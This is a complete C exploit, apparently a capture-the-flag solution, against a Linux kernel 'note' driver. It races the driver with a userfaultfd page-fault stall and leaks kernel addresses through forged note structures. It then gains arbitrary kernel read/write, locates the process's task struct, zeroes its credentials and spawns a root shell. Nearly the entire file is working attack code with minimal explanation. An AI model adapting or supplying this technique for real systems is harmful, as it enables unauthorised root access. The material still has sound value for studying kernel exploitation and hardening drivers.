//make with
// gcc exp.c -o exploit -static -lpthread 

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>

typedef struct _note
{
	size_t idx;
	size_t size;
	char* ptr;

}note;

void errExit(const char* msg){
	puts(msg);
	exit(-1);
}

int fd;
void init(){

	fd = open("/dev/note",0);
	if(fd<0){
	
		exit(-1);
	}
	puts("Dev open");
}
void create(size_t size,char* buf){
	note newnote;
	newnote.size = size;
	newnote.ptr = buf;
	if(ioctl(fd,-256,&newnote)<0){
		errExit("Create note fail");
	}else{
		puts("Create Success!");
	}

}

void edit(size_t index,size_t size ,char* buf){

	note newnote;
	newnote.idx = index;
	newnote.size = size;
	newnote.ptr = buf;
	if(ioctl(fd,-255,&newnote)<0){
		errExit("Edit note fail");
	}
}
void show(size_t index,char* buf){
	note newnote;
	newnote.ptr=buf;
	newnote.idx = index;	
	if(ioctl(fd,-254,&newnote)<0){
		errExit("Reset fail");
	}
}
void reset(){
	note newnote;
	if(ioctl(fd,-253,&newnote)<0){
		errExit("Reset fail");
	}
}

char* buffer;
void evil(){
	reset();
	create(0,buffer);
	create(0,buffer);
}
#define FAULT_PAGE ((void*)(0xdead000))
void* handler(void *arg)
{
	struct uffd_msg msg;
	uintptr_t uffd = (uintptr_t)arg;
	puts("[*] handler created");

	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd,1,-1);
	if (nready != 1)
		errExit("wrong poll return value");
	// this will wait until copy_from_user is called on FAULT_PAGE
	printf("trigger! I'm going to hang\n");
	// now main thread stops at copy_from_user function
	// but now we can do some evil operations!
	
	
	evil();	
	if (read(uffd, &msg, sizeof(msg)) != sizeof(msg))
		errExit("error in reading uffd_msg");
	// read a msg struct from uffd, although not used

	struct uffdio_copy uc;
	//set buffer
	memset(buffer, 0, 0x1000);
	buffer[8] = 0xf0; // notes[1].size = 0xf0
	uc.src = (uintptr_t)buffer;
	uc.dst = (uintptr_t)FAULT_PAGE;
	uc.len = 0x1000;
	uc.mode = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	// resume copy_from_user with buffer as data

	puts("[*] Evil operations done");
	return NULL;
}

void register_userfault()
{
	struct uffdio_api ua;
	struct uffdio_register ur;
	pthread_t thr;

	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;
	if (ioctl(uffd, UFFDIO_API, &ua) == -1)
		errExit("ioctl-UFFDIO_API");
	// create the user fault fd

	if (mmap(FAULT_PAGE,0x1000,7,0x22,-1,0) != FAULT_PAGE)
		errExit("mmap fault page");
	// create page used for user fault

	ur.range.start = (unsigned long)FAULT_PAGE;
	ur.range.len = 0x1000;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("ioctl-UFFDIO_REGISTER");
	// register the page into user fault fd
	// so that if copy_from_user accesses FAULT_PAGE,
	// the access will be hanged, and uffd will receive something

	int s = pthread_create(&thr,NULL,handler,(void*)uffd);
	if(s!=0)
		errExit("pthread_create");
	// create handler that process the user fault
}

int main(int argc, char const *argv[]){
	
	buffer = (char*)malloc(0x1000);
	init();
	create(0x10,buffer);
	//register userfaultfd
	register_userfault();
	//trigger page fault through copy from user 
	edit(0, 1,(char*)FAULT_PAGE);
	//leak key
	//by show 0^key
	show(1,buffer);
	uint64_t key = *(uint64_t *)buffer;
	printf("key=0x%lx\n",key);
	create(0,buffer);
	show(1,buffer);
	uint64_t data_off = *(uint64_t *)(buffer+0x10)^key;//note_addr-page_offset_base
	printf("data_off=0x%lx\n",data_off);
	uint64_t* fake_note = (uint64_t *)buffer;
	fake_note[0] = 0^key;
	fake_note[1] = 8^key;
	fake_note[2] = (data_off+0x2000-0x48)^key;
	edit(1,0x18,buffer);
	show(2,buffer);
	uint64_t note_addr = *(uint64_t *)buffer;//get note_addr
	printf("note_addr=0x%lx\n",note_addr);
	uint64_t page_offset_base = note_addr+0x48-data_off;//page_offset_base = note_addr+data_off
	printf("page_offset_base=0x%lx\n",page_offset_base);
	//Set the name of the calling thread
	if (prctl(PR_SET_NAME, "dotsuGetFB") < 0)
		errExit("prctl set name failed");
	uintptr_t* task;
	//search sturct_task
	for (size_t off = 0;; off += 0x100)
	{
		fake_note[0] = 0 ^ key;
		fake_note[1] = 0xff ^ key;
		fake_note[2] = off ^ key;
		edit(1,0x18, buffer);
		memset(buffer, 0, 0x100);
		show(2, buffer);
		task = (uintptr_t*)memmem(
			buffer, 0x100, "dotsuGetFB", 10);
		if (task != NULL)
		{
			printf("[*] found: %p 0x%lx 0x%lx\n", task, task[-1], task[-2]);
			if (task[-1] > 0xffff000000000000 && task[-2] > 0xffff000000000000)
				break;
		}
	}
	uint64_t cred = task[-1];
	memset(buffer, 0, 0x100);
	//set offset to cred
	fake_note = (uint64_t *)buffer;
	fake_note[0] = 0^key;
	fake_note[1] = 0x20^key;
	fake_note[2] = (cred-page_offset_base+4)^key;
	edit(1,0x18,buffer);
	//modify cred
	memset(buffer, 0, 0x20);
	edit(2,0x20,buffer);
	char* const args[2] = {"/bin/sh", NULL};
	execv("/bin/sh", args);
	return 0;

}



